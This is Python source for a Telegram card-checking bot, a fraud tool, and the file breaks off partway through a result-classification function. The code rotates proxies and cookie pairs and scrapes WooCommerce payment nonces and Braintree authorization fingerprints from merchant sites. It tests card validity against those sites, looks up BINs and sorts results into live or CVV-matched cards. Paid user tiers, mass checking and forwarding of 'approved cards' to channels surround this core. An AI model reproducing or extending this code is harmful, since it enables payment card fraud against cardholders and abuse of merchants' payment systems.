import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
from datetime import datetime, timedelta
import random
import urllib3
import sys
import io
import codecs
import os
import glob
import threading
import asyncio
from filelock import SoftFileLock
from functools import wraps
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Import ppcp module for /pp command
sys.path.append(os.path.join(os.path.dirname(__file__), 'ppcp'))
import asyncio

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Admin user ID
ADMIN_ID = 7405188060

# Mods database file
MODS_DB_FILE = 'mods_db.json'
MODS_DB_LOCK_FILE = 'mods_db.json.lock'

# Auto-scan settings file
AUTO_SCAN_SETTINGS_FILE = 'auto_scan_settings.json'
AUTO_SCAN_SETTINGS_LOCK_FILE = 'auto_scan_settings.json.lock'

# PPCP auto-remove settings file
PPCP_AUTO_REMOVE_SETTINGS_FILE = 'ppcp_auto_remove_settings.json'
PPCP_AUTO_REMOVE_SETTINGS_LOCK_FILE = 'ppcp_auto_remove_settings.json.lock'

# Mass check settings file (enable/disable mass checking per gateway)
MASS_SETTINGS_FILE = 'mass_settings.json'
MASS_SETTINGS_LOCK_FILE = 'mass_settings.json.lock'

# Gateway check interval settings file (check interval per gateway in seconds)
GATEWAY_INTERVAL_SETTINGS_FILE = 'gateway_interval_settings.json'
GATEWAY_INTERVAL_SETTINGS_LOCK_FILE = 'gateway_interval_settings.json.lock'

# Bot settings file (start message, etc.)
BOT_SETTINGS_FILE = 'bot_settings.json'
BOT_SETTINGS_LOCK_FILE = 'bot_settings.json.lock'

# Forward channel ID (set to None to disable forwarding, or use channel username like '@yourchannel' or channel ID like -1001234567890)
FORWARD_CHANNEL_ID = -1003865829143  # Replace with your channel ID or username

# User database file
USER_DB_FILE = 'users_db.json'
USER_DB_LOCK_FILE = 'users_db.json.lock'

# Site freeze state file
SITE_FREEZE_FILE = 'site_freeze_state.json'
SITE_FREEZE_LOCK_FILE = 'site_freeze_state.json.lock'

# Forwarders database file
FORWARDERS_DB_FILE = 'forwarders_db.json'
FORWARDERS_DB_LOCK_FILE = 'forwarders_db.json.lock'

# Channel ID for forwarding approved cards
CHANNEL_ID = None

# Pending approvals (thread-safe with lock)
pending_approvals = {}
pending_approvals_lock = threading.Lock()

# Rate limiting: user_id -> last_check_time
user_rate_limit = {}
user_rate_limit_lock = threading.Lock()
RATE_LIMIT_SECONDS = 1  # Minimum seconds between checks per user (1 second as requested)

# Active mass check tracking: user_id -> {'task': asyncio.Task, 'started': timestamp, 'total_cards': int}
# This allows admin to use commands even when users are mass checking
active_mass_checks = {}
active_mass_checks_lock = threading.Lock()

# Maximum concurrent mass checks per user (to prevent single user from blocking)
MAX_CONCURRENT_MASS_CHECKS_PER_USER = 1

# Maximum total concurrent mass checks (to prevent system overload)
MAX_TOTAL_CONCURRENT_MASS_CHECKS = 5

# REMOVED: Global variables for resource selection (now using per-request local variables)
# This prevents conflicts when multiple users check cards simultaneously

# Add these lines right after the imports to properly handle Unicode output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

def load_user_db():
    """Load user database from file with file locking for thread safety"""
    lock = SoftFileLock(USER_DB_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(USER_DB_FILE):
            try:
                with open(USER_DB_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

def save_user_db(db):
    """Save user database to file with file locking for thread safety"""
    lock = SoftFileLock(USER_DB_LOCK_FILE, timeout=10)
    with lock:
        with open(USER_DB_FILE, 'w') as f:
            json.dump(db, f, indent=2)

def load_site_freeze_state():
    """Load site freeze state from file with file locking for thread safety"""
    lock = SoftFileLock(SITE_FREEZE_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(SITE_FREEZE_FILE):
            try:
                with open(SITE_FREEZE_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

def save_site_freeze_state(state):
    """Save site freeze state to file with file locking for thread safety"""
    lock = SoftFileLock(SITE_FREEZE_LOCK_FILE, timeout=10)
    with lock:
        with open(SITE_FREEZE_FILE, 'w') as f:
            json.dump(state, f, indent=2)

def load_forwarders_db():
    """Load forwarders database from file with file locking for thread safety"""
    lock = SoftFileLock(FORWARDERS_DB_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(FORWARDERS_DB_FILE):
            try:
                with open(FORWARDERS_DB_FILE, 'r') as f:
                    db = json.load(f)
                    # Ensure all gateways exist (for backward compatibility)
                    if 'ppro' not in db:
                        db['ppro'] = []
                    return db
            except:
                return {'b3': [], 'pp': [], 'ppro': []}
        return {'b3': [], 'pp': [], 'ppro': []}

def save_forwarders_db(db):
    """Save forwarders database to file with file locking for thread safety"""
    lock = SoftFileLock(FORWARDERS_DB_LOCK_FILE, timeout=10)
    with lock:
        with open(FORWARDERS_DB_FILE, 'w') as f:
            json.dump(db, f, indent=2)

def add_forwarder(gateway, name, bot_token, chat_id):
    """Add a new forwarder"""
    db = load_forwarders_db()
    forwarder = {
        'name': name,
        'bot_token': bot_token,
        'chat_id': chat_id,
        'enabled': True
    }
    db[gateway].append(forwarder)
    save_forwarders_db(db)
    return True

def remove_forwarder(gateway, index):
    """Remove a forwarder by index"""
    db = load_forwarders_db()
    if 0 <= index < len(db[gateway]):
        db[gateway].pop(index)
        save_forwarders_db(db)
        return True
    return False

def update_forwarder(gateway, index, name=None, bot_token=None, chat_id=None, enabled=None):
    """Update a forwarder"""
    db = load_forwarders_db()
    if 0 <= index < len(db[gateway]):
        if name is not None:
            db[gateway][index]['name'] = name
        if bot_token is not None:
            db[gateway][index]['bot_token'] = bot_token
        if chat_id is not None:
            db[gateway][index]['chat_id'] = chat_id
        if enabled is not None:
            db[gateway][index]['enabled'] = enabled
        save_forwarders_db(db)
        return True
    return False

def get_forwarders(gateway):
    """Get all forwarders for a gateway"""
    db = load_forwarders_db()
    return db.get(gateway, [])

def load_mods_db():
    """Load mods database from file with file locking for thread safety"""
    lock = SoftFileLock(MODS_DB_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(MODS_DB_FILE):
            try:
                with open(MODS_DB_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

def save_mods_db(db):
    """Save mods database to file with file locking for thread safety"""
    lock = SoftFileLock(MODS_DB_LOCK_FILE, timeout=10)
    with lock:
        with open(MODS_DB_FILE, 'w') as f:
            json.dump(db, f, indent=2)

def is_mod(user_id):
    """Check if user is a mod"""
    db = load_mods_db()
    return str(user_id) in db

def is_admin_or_mod(user_id):
    """Check if user is admin or mod"""
    return user_id == ADMIN_ID or is_mod(user_id)

def get_active_mass_check_count():
    """Get the total number of active mass checks"""
    with active_mass_checks_lock:
        return len(active_mass_checks)

def get_user_mass_check_count(user_id):
    """Get the number of active mass checks for a specific user"""
    with active_mass_checks_lock:
        return sum(1 for uid in active_mass_checks if uid == user_id)

def register_mass_check(user_id, total_cards):
    """Register a new mass check for a user"""
    with active_mass_checks_lock:
        active_mass_checks[user_id] = {
            'started': time.time(),
            'total_cards': total_cards
        }

def unregister_mass_check(user_id):
    """Unregister a mass check when completed"""
    with active_mass_checks_lock:
        if user_id in active_mass_checks:
            del active_mass_checks[user_id]

def can_start_mass_check(user_id):
    """Check if a user can start a new mass check"""
    # Admin always can start mass checks
    if user_id == ADMIN_ID:
        return True, None
    
    with active_mass_checks_lock:
        # Check user's concurrent mass checks
        user_count = sum(1 for uid in active_mass_checks if uid == user_id)
        if user_count >= MAX_CONCURRENT_MASS_CHECKS_PER_USER:
            return False, "You already have a mass check in progress. Please wait for it to complete."
        
        # Check total concurrent mass checks (but allow admin to bypass)
        total_count = len(active_mass_checks)
        if total_count >= MAX_TOTAL_CONCURRENT_MASS_CHECKS:
            return False, f"System is busy with {total_count} mass checks. Please try again later."
    
    return True, None

def add_mod(user_id, added_by):
    """Add a user as mod"""
    db = load_mods_db()
    db[str(user_id)] = {
        'user_id': user_id,
        'added_by': added_by,
        'added_date': datetime.now().isoformat()
    }
    save_mods_db(db)
    return True

def remove_mod(user_id):
    """Remove a user from mods"""
    db = load_mods_db()
    if str(user_id) in db:
        del db[str(user_id)]
        save_mods_db(db)
        return True
    return False

def get_all_mods():
    """Get all mods"""
    return load_mods_db()

def load_auto_scan_settings():
    """Load auto-scan settings from file"""
    lock = SoftFileLock(AUTO_SCAN_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(AUTO_SCAN_SETTINGS_FILE):
            try:
                with open(AUTO_SCAN_SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {'enabled': False, 'interval_hours': 1}
        return {'enabled': False, 'interval_hours': 1}

def save_auto_scan_settings(settings):
    """Save auto-scan settings to file"""
    lock = SoftFileLock(AUTO_SCAN_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        with open(AUTO_SCAN_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)

def load_ppcp_auto_remove_settings():
    """Load PPCP auto-remove settings from file"""
    lock = SoftFileLock(PPCP_AUTO_REMOVE_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(PPCP_AUTO_REMOVE_SETTINGS_FILE):
            try:
                with open(PPCP_AUTO_REMOVE_SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {'enabled': True}  # Default to enabled for backward compatibility
        return {'enabled': True}  # Default to enabled for backward compatibility

def save_ppcp_auto_remove_settings(settings):
    """Save PPCP auto-remove settings to file"""
    lock = SoftFileLock(PPCP_AUTO_REMOVE_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        with open(PPCP_AUTO_REMOVE_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)

def load_ppcp_sites():
    """Load PPCP sites from ppcp/sites.txt"""
    sites = []
    sites_file = 'ppcp/sites.txt'
    if os.path.exists(sites_file):
        with open(sites_file, 'r') as f:
            sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    return sites

def save_ppcp_sites(sites):
    """Save PPCP sites to ppcp/sites.txt"""
    sites_file = 'ppcp/sites.txt'
    os.makedirs('ppcp', exist_ok=True)
    with open(sites_file, 'w') as f:
        for site in sites:
            if site.strip():
                f.write(site.strip() + '\n')
    return True

def add_ppcp_site(site_url):
    """Add a site to PPCP sites"""
    sites = load_ppcp_sites()
    if site_url not in sites:
        sites.append(site_url)
        save_ppcp_sites(sites)
        return True
    return False

def remove_ppcp_site(site_url):
    """Remove a site from PPCP sites"""
    sites = load_ppcp_sites()
    if site_url in sites:
        sites.remove(site_url)
        save_ppcp_sites(sites)
        return True
    return False

# ============= PAYPALPRO SITES FUNCTIONS =============

def load_paypalpro_sites():
    """Load PayPal Pro sites from paypalpro/sites.txt"""
    sites = []
    sites_file = 'paypalpro/sites.txt'
    if os.path.exists(sites_file):
        with open(sites_file, 'r') as f:
            sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    return sites

def save_paypalpro_sites(sites):
    """Save PayPal Pro sites to paypalpro/sites.txt"""
    sites_file = 'paypalpro/sites.txt'
    os.makedirs('paypalpro', exist_ok=True)
    with open(sites_file, 'w') as f:
        for site in sites:
            if site.strip():
                f.write(site.strip() + '\n')
    return True

def add_paypalpro_site(site_url):
    """Add a site to PayPal Pro sites"""
    sites = load_paypalpro_sites()
    if site_url not in sites:
        sites.append(site_url)
        save_paypalpro_sites(sites)
        return True
    return False

def remove_paypalpro_site(site_url):
    """Remove a site from PayPal Pro sites"""
    sites = load_paypalpro_sites()
    if site_url in sites:
        sites.remove(site_url)
        save_paypalpro_sites(sites)
        return True
    return False

# ============= MASS SETTINGS FUNCTIONS =============

def load_mass_settings():
    """Load mass check settings from file"""
    lock = SoftFileLock(MASS_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(MASS_SETTINGS_FILE):
            try:
                with open(MASS_SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        # Default: all gateways enabled for mass checking
        return {
            'b3': True,   # Braintree Auth
            'pp': True,   # PPCP
            'ppro': True  # PayPal Pro
        }

def save_mass_settings(settings):
    """Save mass check settings to file"""
    lock = SoftFileLock(MASS_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        with open(MASS_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)

def is_mass_enabled(gateway):
    """Check if mass checking is enabled for a gateway"""
    settings = load_mass_settings()
    return settings.get(gateway, True)

def toggle_mass_setting(gateway):
    """Toggle mass checking for a gateway"""
    settings = load_mass_settings()
    settings[gateway] = not settings.get(gateway, True)
    save_mass_settings(settings)
    return settings[gateway]

# ============= GATEWAY CHECK INTERVAL SETTINGS FUNCTIONS =============

# Valid check intervals in seconds
VALID_CHECK_INTERVALS = [1, 5, 10, 15, 20, 30]

def load_gateway_interval_settings():
    """Load gateway check interval settings from file"""
    lock = SoftFileLock(GATEWAY_INTERVAL_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(GATEWAY_INTERVAL_SETTINGS_FILE):
            try:
                with open(GATEWAY_INTERVAL_SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        # Default: 1 second for all gateways
        return {
            'b3': 1,    # Braintree Auth
            'pp': 1,    # PPCP
            'ppro': 1   # PayPal Pro
        }

def save_gateway_interval_settings(settings):
    """Save gateway check interval settings to file"""
    lock = SoftFileLock(GATEWAY_INTERVAL_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        with open(GATEWAY_INTERVAL_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)

def get_gateway_interval(gateway):
    """Get check interval for a specific gateway in seconds"""
    settings = load_gateway_interval_settings()
    return settings.get(gateway, 1)

def set_gateway_interval(gateway, interval_seconds):
    """Set check interval for a specific gateway"""
    if interval_seconds not in VALID_CHECK_INTERVALS:
        return False
    settings = load_gateway_interval_settings()
    settings[gateway] = interval_seconds
    save_gateway_interval_settings(settings)
    return True

def get_all_gateway_intervals():
    """Get all gateway intervals"""
    return load_gateway_interval_settings()

# ============= BOT SETTINGS FUNCTIONS =============

def load_bot_settings():
    """Load bot settings from file"""
    lock = SoftFileLock(BOT_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(BOT_SETTINGS_FILE):
            try:
                with open(BOT_SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        # Default settings
        return {
            'start_message': None,  # None means use default
            'pinned_message': None,
            'pinned_message_id': None
        }

def save_bot_settings(settings):
    """Save bot settings to file"""
    lock = SoftFileLock(BOT_SETTINGS_LOCK_FILE, timeout=10)
    with lock:
        with open(BOT_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=2)

def get_start_message():
    """Get custom start message or None for default"""
    settings = load_bot_settings()
    return settings.get('start_message')

def set_start_message(message):
    """Set custom start message"""
    settings = load_bot_settings()
    settings['start_message'] = message
    save_bot_settings(settings)
    return True

def reset_start_message():
    """Reset start message to default"""
    settings = load_bot_settings()
    settings['start_message'] = None
    save_bot_settings(settings)
    return True

def is_site_frozen(site_folder):
    """Check if a site is frozen"""
    state = load_site_freeze_state()
    return state.get(site_folder, {}).get('frozen', False)

def set_site_frozen(site_folder, frozen):
    """Set the frozen state of a site"""
    state = load_site_freeze_state()
    if site_folder not in state:
        state[site_folder] = {}
    state[site_folder]['frozen'] = frozen
    state[site_folder]['updated_at'] = datetime.now().isoformat()
    save_site_freeze_state(state)
    return True

def get_all_b3_sites():
    """Get all B3 site folders (site_* directories)"""
    sites = []
    try:
        for item in os.listdir('.'):
            if os.path.isdir(item) and (item.startswith('site_') or item.startswith('site')):
                # Check if folder contains required files
                site_txt = os.path.join(item, 'site.txt')
                if os.path.exists(site_txt):
                    sites.append(item)
    except Exception as e:
        print(f"Error getting B3 sites: {str(e)}")
    return sorted(sites)

def get_site_files(site_folder):
    """Get all editable files in a site folder"""
    files = []
    try:
        for item in os.listdir(site_folder):
            file_path = os.path.join(site_folder, item)
            if os.path.isfile(file_path):
                # Only include text-based files
                if item.endswith('.txt') or item.endswith('.json') or item.endswith('.py'):
                    files.append(item)
    except Exception as e:
        print(f"Error getting site files: {str(e)}")
    return sorted(files)

def read_site_file(site_folder, filename):
    """Read content of a file in a site folder"""
    try:
        file_path = os.path.join(site_folder, filename)
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error reading file: {str(e)}"

def write_site_file(site_folder, filename, content):
    """Write content to a file in a site folder"""
    try:
        file_path = os.path.join(site_folder, filename)
        with open(file_path, 'w') as f:
            f.write(content)
        return True
    except Exception as e:
        print(f"Error writing file: {str(e)}")
        return False

def is_user_approved(user_id):
    """Check if user is approved and access hasn't expired"""
    db = load_user_db()
    user_id_str = str(user_id)
    
    if user_id_str not in db:
        return False
    
    user_data = db[user_id_str]
    
    # Check if lifetime access
    if user_data.get('access_type') == 'lifetime':
        return True
    
    # Check if access has expired
    expiry_date = datetime.fromisoformat(user_data.get('expiry_date'))
    if datetime.now() > expiry_date:
        return False
    
    return True

def approve_user(user_id, duration_type):
    """Approve a user with specified duration"""
    db = load_user_db()
    user_id_str = str(user_id)
    
    if duration_type == 'lifetime':
        expiry_date = None
        access_type = 'lifetime'
    else:
        # Calculate expiry date
        if duration_type == '1day':
            expiry_date = datetime.now() + timedelta(days=1)
        elif duration_type == '1week':
            expiry_date = datetime.now() + timedelta(weeks=1)
        elif duration_type == '1month':
            expiry_date = datetime.now() + timedelta(days=30)
        else:
            return False
        
        access_type = duration_type
    
    db[user_id_str] = {
        'user_id': user_id,
        'approved_date': datetime.now().isoformat(),
        'expiry_date': expiry_date.isoformat() if expiry_date else None,
        'access_type': access_type
    }
    
    save_user_db(db)
    return True

def discover_site_folders():
    """Discover available site folders in the current directory (excludes frozen sites)"""
    try:
        # Find all directories that start with 'site_' or 'site'
        site_folders = []
        for item in os.listdir('.'):
            if os.path.isdir(item) and (item.startswith('site_') or item.startswith('site')):
                # Check if folder contains required files
                site_txt = os.path.join(item, 'site.txt')
                cookies_1 = os.path.join(item, 'cookies_1.txt')
                cookies_2 = os.path.join(item, 'cookies_2.txt')
                
                if os.path.exists(site_txt) and os.path.exists(cookies_1) and os.path.exists(cookies_2):
                    # Skip frozen sites
                    if not is_site_frozen(item):
                        site_folders.append(item)
        
        return site_folders
    except Exception as e:
        print(f"Error discovering site folders: {str(e)}")
        return []

def select_random_site():
    """Select a random site folder from available sites (thread-safe)"""
    site_folders = discover_site_folders()
    if not site_folders:
        return '.'
    
    # Select random site folder (thread-safe random)
    selected_site = random.choice(site_folders)
    return selected_site

def discover_cookie_pairs(site_folder):
    """Discover available cookie pairs in the specified site folder (thread-safe)"""
    try:
        # Use specified site folder or current directory
        search_dir = site_folder if site_folder else '.'
        
        # Find all cookies_X-1.txt files
        pattern1 = os.path.join(search_dir, 'cookies_*-1.txt')
        pattern2 = os.path.join(search_dir, 'cookies_*-2.txt')
        
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
        pairs = []
        for file1 in files1:
            # Extract the pair number from filename like "cookies_1-1.txt"
            basename = os.path.basename(file1)
            pair_id = basename.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = os.path.join(search_dir, f'cookies_{pair_id}-2.txt')
            
            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
        
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def select_random_cookie_pair(site_folder):
    """Select a random cookie pair from available pairs in the specified site folder (thread-safe)"""
    pairs = discover_cookie_pairs(site_folder)
    if not pairs:
        # Fallback to simple cookies_1.txt and cookies_2.txt
        search_dir = site_folder if site_folder else '.'
        file1 = os.path.join(search_dir, 'cookies_1.txt')
        file2 = os.path.join(search_dir, 'cookies_2.txt')
        return {'file1': file1, 'file2': file2, 'id': 'fallback'}
    
    # Select random pair (thread-safe random)
    selected_pair = random.choice(pairs)
    return selected_pair

def select_new_cookie_pair_silent(site_folder):
    """Select a new random cookie pair without printing (for each card check) (thread-safe)"""
    pairs = discover_cookie_pairs(site_folder)
    if not pairs:
        # Fallback to simple cookie files
        search_dir = site_folder if site_folder else '.'
        file1 = os.path.join(search_dir, 'cookies_1.txt')
        file2 = os.path.join(search_dir, 'cookies_2.txt')
        return {'file1': file1, 'file2': file2, 'id': 'fallback'}

    # Select random pair (thread-safe random)
    selected_pair = random.choice(pairs)
    return selected_pair

def select_random_proxy(site_folder):
    """Select a random proxy from proxy.txt in the specified site folder (thread-safe)"""
    try:
        search_dir = site_folder if site_folder else '.'
        proxy_file = os.path.join(search_dir, 'proxy.txt')
        
        # Check if proxy file exists
        if not os.path.exists(proxy_file):
            return None
        
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]
            
            # Check if proxy file is empty
            if not proxies:
                return None
            
            # Select random proxy (thread-safe random)
            selected_proxy = random.choice(proxies)
            return selected_proxy
    except Exception as e:
        print(f"⚠️ Error selecting proxy: {str(e)}, proceeding without proxy")
        return None

def read_cookies_from_file(filename):
    """Read cookies from a specific file (thread-safe)"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            # Create a namespace dictionary for exec
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

# Read domain URL from site.txt in the specified site folder
def get_domain_url(site_folder):
    """Get domain URL from site.txt in the specified site folder (thread-safe)"""
    try:
        search_dir = site_folder if site_folder else '.'
        site_file = os.path.join(search_dir, 'site.txt')
        
        with open(site_file, 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"Error reading site.txt: {str(e)}")
        return ""  # fallback

# Read cookies from the specified cookie pair
def get_cookies_1(cookie_pair):
    """Get cookies from first cookie file (thread-safe)"""
    return read_cookies_from_file(cookie_pair['file1'])

# Read cookies from the specified cookie pair
def get_cookies_2(cookie_pair):
    """Get cookies from second cookie file (thread-safe)"""
    return read_cookies_from_file(cookie_pair['file2'])

user = generate_user_agent()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def get_headers(domain_url):
    """Get headers with specified domain URL (thread-safe)"""
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy(proxy_string):
    """Parse proxy string and return proxy dict (thread-safe)"""
    if not proxy_string:
        return None

    # Parse proxy string (format: host:port:username:password)
    parts = proxy_string.split(':')
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_dict = {
            'http': f'http://{username}:{password}@{host}:{port}',
            'https': f'http://{username}:{password}@{host}:{port}'
        }
        return proxy_dict
    return None

def get_new_auth(site_folder, cookie_pair, proxy_string):
    """Get fresh authorization tokens (thread-safe)"""
    domain_url = get_domain_url(site_folder)  # Read fresh domain URL
    cookies_1 = get_cookies_1(cookie_pair)    # Read fresh cookies
    headers = get_headers(domain_url)         # Get headers with current domain
    
    proxy = get_random_proxy(proxy_string)
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        # Get add_nonce
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            print("Error: Nonce not found in response")
            return None, None, 'cookie_expired'

        # Get authorization token
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    print("Error: Authorization fingerprint not found")
                    return None, None, 'cookie_expired'
                return add_nonce[0], au[0], None
            except Exception as e:
                print(f"Error decoding token: {str(e)}")
                return None, None, 'cookie_expired'
        else:
            print("Error: Client token not found in response")
            return None, None, 'cookie_expired'
    else:
        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
        return None, None, 'site_error'

def country_code_to_emoji(country_code):
    # Map of country codes to emojis for common countries
    country_emoji_map = {
        'PH': '🇵🇭',
        'US': '🇺🇸',
        'GB': '🇬🇧',
        'CA': '🇨🇦',
        'AU': '🇦🇺',
        'DE': '🇩🇪',
        'FR': '🇫🇷',
        'IN': '🇮🇳',
        'JP': '🇯🇵',
        'CN': '🇨🇳',
        'BR': '🇧🇷',
        'RU': '🇷🇺',
        'ZA': '🇿🇦',
        'NG': '🇳🇬',
        'MX': '🇲🇽',
        'IT': '🇮🇹',
        'ES': '🇪🇸',
        'NL': '🇳🇱',
        'SE': '🇸🇪',
        'CH': '🇨🇭',
        'KR': '🇰🇷',
        'SG': '🇸🇬',
        'NZ': '🇳🇿',
        'IE': '🇮🇪',
        'BE': '🇧🇪',
        'AT': '🇦🇹',
        'DK': '🇩🇰',
        'NO': '🇳🇴',
        'FI': '🇫🇮',
        'PL': '🇵🇱',
        'CZ': '🇨🇿',
        'PT': '🇵🇹',
        'GR': '🇬🇷',
        'HU': '🇭🇺',
        'RO': '🇷🇴',
        'TR': '🇹🇷',
        'IL': '🇮🇱',
        'AE': '🇦🇪',
        'SA': '🇸🇦',
        'EG': '🇪🇬',
        'AR': '🇦🇷',
        'CL': '🇨🇱',
        'CO': '🇨🇴',
        'PE': '🇵🇪',
        'VE': '🇻🇪',
        'TH': '🇹🇭',
        'MY': '🇲🇾',
        'ID': '🇮🇩',
        'VN': '🇻🇳',
    }
    if not country_code or len(country_code) != 2:
        return '🏳️'
    country_code = country_code.upper()
    return country_emoji_map.get(country_code, '🏳️')

def get_bin_info(bin_number):
    import time
    start_time = time.time()
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        print(f"BIN Lookup HTTP Code: {response.status_code}")
        print(f"BIN Lookup Response: {response.text}")
        if response.status_code == 200 and response.text:
            data = response.json()
            if data:
                raw_type = (data.get('type') or data.get('card_type') or '').lower().strip()
                def normalizeCardType(t):
                    if 'debit' in t:
                        return 'DEBIT'
                    elif 'credit' in t:
                        return 'CREDIT'
                    else:
                        return 'UNKNOWN'
                def normalizeCardBrand(b):
                    if not b:
                        return 'UNKNOWN'
                    b = b.lower()
                    if 'visa' in b:
                        return 'VISA'
                    elif 'mastercard' in b or 'master' in b:
                        return 'MASTERCARD'
                    elif 'amex' in b or 'american express' in b:
                        return 'AMEX'
                    elif 'discover' in b:
                        return 'DISCOVER'
                    else:
                        return b.upper()
                country_code = None
                if isinstance(data.get('country'), dict):
                    country_code = data.get('country').get('alpha2') or data.get('country').get('code')
                else:
                    country_code = None
                print(f"DEBUG: Extracted country code: {country_code}")  # Debug print
                emoji_flag = country_code_to_emoji(country_code)
                print(f"DEBUG: Converted emoji flag: {emoji_flag}")  # Debug print
                result = {
                    'bin': bin_number,
                    'type': normalizeCardType(raw_type),
                    'brand': normalizeCardBrand(data.get('brand') or data.get('card_brand') or data.get('card') or ''),
                    'bank': data.get('bank', {}).get('name') if isinstance(data.get('bank'), dict) else (data.get('bank') or data.get('issuer') or data.get('bank_name') or 'N/A'),
                    'country': data.get('country', {}).get('name') if isinstance(data.get('country'), dict) else (data.get('country') or data.get('country_name') or 'N/A'),
                    'is_debit': 'debit' in raw_type,
                    'is_credit': 'credit' in raw_type,
                    'time_taken': f"{round(time.time() - start_time, 3)}s",
                    'card_level': data.get('card_level') or 'N/A'
                }
                for key, value in result.items():
                    if isinstance(value, str):
                        result[key] = value.strip() or 'N/A'
                return {
                    'brand': result['brand'],
                    'type': result['type'],
                    'level': result['card_level'],
                    'bank': result['bank'],
                    'country': result['country'],
                    'emoji': emoji_flag
                }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🏳️'
    }


def default_bin_info():
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🏳️'
    }


def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
